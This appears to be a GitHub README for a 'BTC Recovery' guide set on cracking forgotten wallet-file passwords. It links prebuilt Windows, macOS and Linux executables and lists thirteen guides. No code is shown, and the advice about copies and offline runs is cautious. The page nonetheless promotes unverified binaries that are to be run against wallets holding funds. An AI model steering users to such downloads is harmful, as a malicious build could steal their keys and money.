<div align="center">
<img src="assets/banner-hub.png" alt="BTC Recovery wallet file and password guides">
</div>

<h1 align="center">BTC Recovery wallet file and password guides</h1>

<p align="center">Thirteen guides for encrypted wallet files, forgotten passwords and devices that are gone.</p>

<div align="center">
<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
</div>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

## What this repository is for

This repository holds the wallet-file half of the BTC Recovery guides: the cases where you have an encrypted file and not enough of the password, or a device that will not unlock. Thirteen pages cover Bitcoin Core `wallet.dat` files, Electrum, MetaMask vaults, Blockchain.com, MultiBit, BIP38 paper-wallet keys, hardware-wallet phrases without the device, and the wallets this tool deliberately does not target. All of them follow the same discipline. You keep the file and the candidate rules on the machine that runs the search, you test candidates against the container rather than against a guess, and you keep a copy of the file untouched. The pages are specific about which input is worth correcting when a run comes back empty, because that is usually faster than adding more guesses.

## Who it is for

- You have a wallet file and a password that is close but not exact.
- The wallet software that made the file is no longer installed, or no longer runs.
- A hardware device is lost or broken and only the phrase backup exists, or the reverse.
- You are checking whether the wallet you are holding is one this tool can work with at all.

## Start here

- [bitcoin-wallet-password-recovery-with-btcrecover](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md) covers the general case and the candidate patterns that work.
- [btcrecover-wallet-dat-password-recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md) is the Bitcoin Core file, start to finish.
- [btcrecover-electrum-wallet-password-recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-electrum-wallet-password-recovery.md) covers Electrum, including its seed and wallet-file differences.
- [wallets-btcrecover-does-not-support](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md) is the boundary page: read it before you spend a day on the wrong file.

## How to use these guides

1. Copy the wallet file somewhere safe and work on the copy, never on the only file you have.
2. Identify which application wrote it; the format decides the rules the search can use.
3. Write down what you remember about the password: length, a word, a year, a pattern of capitalisation.
4. Build candidate rules from those fragments and run them against the file offline.
5. When a password is found, restore from the backup copy and move the funds, rather than reusing the wallet in place.
6. Record the rule set that produced a hit, because the same pattern often opens the backup copy of the same wallet.

## The guides, grouped

| Guide | What it answers |
| --- | --- |
| [Bitcoin wallet password recovery tool](bitcoin-wallet-password-recovery-with-btcrecover.md) | A Bitcoin wallet password protects a file on your disk; it is not the seed phrase and not a private key. |
| [wallet.dat password recovery for Bitcoin Core](btcrecover-wallet-dat-password-recovery.md) | A `wallet.dat` file is Bitcoin Core's wallet, encrypted with a password you chose at some point; it cannot be reset, but it can be searched. |
| [Electrum wallet password and seed recovery](btcrecover-electrum-wallet-password-recovery.md) | Electrum keeps two separate things to get wrong: a wallet file encrypted with a password, and a seed phrase in one of several formats. |
| [MetaMask vault password recovery](recover-metamask-password-with-btcrecover.md) | A MetaMask wallet is a vault file inside your browser profile, encrypted with the password you set on that device. |
| [Blockchain.com wallet recovery](blockchain-com-wallet-recovery-with-btcrecover.md) | The file needs a password search; the phrase needs its own format, not a standard BIP39 restore. |
| [MultiBit wallet password recovery](btcrecover-multibit-wallet-password-recovery.md) | What they need is a copy of the file, a candidate list built from what you remember, and a local search against the right wallet type. |
| [Ledger and Trezor seed recovery without the device](btcrecover-hardware-wallet-recovery.md) | A hardware wallet is a copy of a seed, not the seed itself: the phrase restores the same accounts in any compatible wallet. |
| [BIP38 encrypted paper wallet recovery](decrypt-bip38-paper-wallet-with-btcrecover.md) | A BIP38 paper wallet holds one private key, encrypted with a passphrase you chose when you made it. |
| [Wallets and files BTCRecover does not target](wallets-btcrecover-does-not-support.md) | BTCRecover works on local wallet files and seed phrases of the formats it supports, not on every wallet that exists. |
| [A private key is not a seed phrase](private-key-vs-seed-phrase-btcrecover.md) | A private key controls one address; a seed phrase regenerates a whole wallet. |
| [Ledger Recover and the alternatives](btcrecover-ledger-recover-alternatives.md) | It solves one failure mode well and changes another, which is why the alternatives are worth understanding before subscribing. |
| [Blockchain.com legacy wallet versions](blockchain-com-legacy-wallet-versions-btcrecover.md) | Old wallets from this service come in several generations, and the generation decides how a recovery works: the file records which version wrote it. |
| [Trezor and Ledger model-by-model seed restore](hardware-wallet-model-variants-btcrecover.md) | Two devices from the same maker can behave differently on the day of a restore: word counts vary. |

## What each guide changes

| Your situation | Guide | What you end up with |
| --- | --- | --- |
| A `wallet.dat` password almost remembered | [wallet.dat password recovery for Bitcoin Core](btcrecover-wallet-dat-password-recovery.md) | The password, tested against a copy of the file without touching the original. |
| An Electrum password or seed problem | [Electrum wallet password and seed recovery](btcrecover-electrum-wallet-password-recovery.md) | The wallet type, file and seed questions answered in the order that wastes least time. |
| A MetaMask vault that will not unlock | [MetaMask vault password recovery](recover-metamask-password-with-btcrecover.md) | The vault password recovered locally from the extension's stored file. |
| An old Blockchain.com wallet | [Blockchain.com wallet recovery](blockchain-com-wallet-recovery-with-btcrecover.md) | The version of the wallet identified, then the password tested against it. |
| A device that no longer powers on | [Ledger and Trezor seed recovery without the device](btcrecover-hardware-wallet-recovery.md) | The phrase-only route back to the same keys, without the device present. |
| A wallet this tool cannot open | [Wallets and files BTCRecover does not target](wallets-btcrecover-does-not-support.md) | The format named, so the time is not spent on a search that cannot succeed. |

## Common first questions

### Can a password be recovered from a wallet file without the file?

No. The search needs the encrypted container to test candidates against, so a lost file is a lost wallet as far as this method goes.

### Does this work on a wallet created by a phone app?

Only where the app's file format is one the tool supports. The boundary guide names the ones it does, and the ones it does not.

### Is it safe to leave the file on a machine while it runs?

The guides assume the machine is yours and the run is done with the network disconnected, with a backup of the file kept separately.

### What if the password was never written down?

The search works from what you remember. If nothing is remembered, there is no candidate list to build and the guide says so rather than suggesting otherwise.

### Does the password search damage the wallet file?

No, because it tests candidates against a copy and never rewrites the container. Keep the original untouched until a password is confirmed, then restore from the copy.

## Before you install

Install the current release first, and copy the wallet file before you point the application at it. A wallet-file search is a read of the container, but the safe habit is the same one that protects you from a failed run: the only copy that matters is the one you have not touched. Name the software that wrote the file before you choose a rule set, because a Bitcoin Core file and an Electrum wallet need different candidates. If the wallet still holds a balance, do the run on a machine that is offline, and move the funds from a restored wallet rather than from the original. Keep a note of the candidate rules that came back empty, so a later attempt starts from the last one rather than from the beginning of the same list.

## About

This repository is the wallet-file half of the guide set, kept apart from the phrase guides because the two jobs share a method and nothing else. One needs an address to check candidates against; the other needs the encrypted container itself. The application repository publishes the build, the seed-phrase repository covers words, and the tool repository carries the reference pages and the full index. Where a wallet falls outside what the tool targets, this repository says so on its own boundary page rather than leaving a reader to discover it after an overnight run. A page here always names the software that wrote the file before it names a rule, because the format is what decides whether the candidate list can succeed at all, and because a reader who skips that step tends to spend the night on a search that was never going to match. A wallet file that has been rewritten by a failed restore is a harder problem than the one the reader arrived with, so the copy comes first on every page in this repository.

## License

This repository is released under the GPL-2.0 licence, and the full text is in [LICENSE](LICENSE).

---

**BTC Recovery** - offline Bitcoin wallet recovery for Windows, macOS and Linux.

Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).
